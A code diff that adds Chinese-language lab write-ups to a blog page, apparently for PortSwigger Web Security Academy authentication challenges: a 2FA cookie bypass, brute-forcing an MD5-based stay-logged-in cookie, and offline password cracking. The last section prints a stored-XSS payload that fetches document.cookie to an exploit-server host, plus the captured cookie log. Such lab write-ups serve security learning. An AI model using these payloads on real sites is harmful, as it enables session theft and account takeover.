@@ -367,6 +367,34 @@ export default function Post() {
             <X.P>频率限制有逻辑缺陷：成功登录可以重置频率限制。因此间隔地用本题给的`wiener`账号登录、枚举字典尝试登录`carlos`，确保在触发频率限制前重置，即可枚举出密码为`matrix`。（然而这样不能并行了，因为要保证请求有序到达）</X.P>
             <X.H2>Pr: Username enumeration via account lock</X.H2>
             <X.P>频率限制有逻辑缺陷：只有存在的用户多次尝试登录才会被限制，如果用户不存在则会一直报用户名密码错误。利用这一点可以对字典上所有用户名发出几次请求（大于三次就会触发频率限制），然后找出最后一轮请求中回显不同的用户名`af`，然后枚举出密码为`moscow`。</X.P>
+            <X.H2>Pr: 2FA broken logic</X.H2>
+            <X.P>发现网站一些不合理的行为：验证码登录（`/login2`页面）验证的用户依赖于Cookie中的`verify`字段；在`/login2`页面直接刷新就可以接收到验证邮件。</X.P>
+            <X.P>利用这个问题，可以绕过账号密码登录，把Cookie改为`verify=carlos`，`GET`请求`/login2`后一次后，爆破验证码登录目标用户账号。</X.P>
+            <X.H2>Pr: Brute-forcing a stay-logged-in cookie</X.H2>
+            <X.P>登录时选择Stay logged in，看到Cookie中保存了一条`stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw`，Base64解码的结果为`wiener:51dc30ddc473d43a6011e9ebba6ca770`，可以反查到这是`peter`的MD5值。（有些在线网站可以反查MD5值）</X.P>
+            <X.P>这样可以根据本题给的密码字典，构造出`stay-logged-in=base64("carlos:" + MD5(password))`形式的Cookie值，去请求`/my-account`；请求时不带`session`这个Cookie，此时如果密码正确会返回`200`，否则则被重定向到登录页面（`302`）。找到成功的Cookie值之后，复制到浏览器，访问`/my-account`即可登入`carlos`的账号。</X.P>
+            <X.H2>Pr: Offline password cracking</X.H2>
+            <X.P>本题和上一题一样有Stay logged in功能，要拿到`carlos`的密码，需要用XSS带出`carlos`的Cookie。首先，评论功能有存储型XSS，评论：</X.P>
+            <X.CodeBlock
+                language="html"
+                code={`
+                <script>
+                    fetch("https://exploit-0ae8005103bdf9bb82115652013b0094.exploit-server.net/exploit?c=" + document.cookie);
+                </script>
+                `}
+            />
+            <X.P>然后在Exploit Server构造payload，直接跳转到留评论的页面就可以：</X.P>
+            <X.CodeBlock
+                language="html"
+                code={`
+                <script>
+                    window.location = "https://0a0300b903cff9cd82a0573f00b700d8.web-security-academy.net/post?postId=1"
+                </script>
+                `}
+            />
+            <X.P>保存后，在访问记录里就可以看到：</X.P>
+            <X.CodeBlock language="text" code="GET /exploit?c=secret=UzB89kNJHCZLkdW393yCPznnISTFaGyN;%20stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz HTTP/1.1" />
+            <X.P>解码`stay-logged-in`，得到密码的MD5值`26323c16d5f4dabff3bb136f2460a943`，反查到明文是`onceuponatime`。</X.P>
 
             <X.H1>Information disclosure</X.H1>
             <X.H2>Ap: Information disclosure in error messages</X.H2>
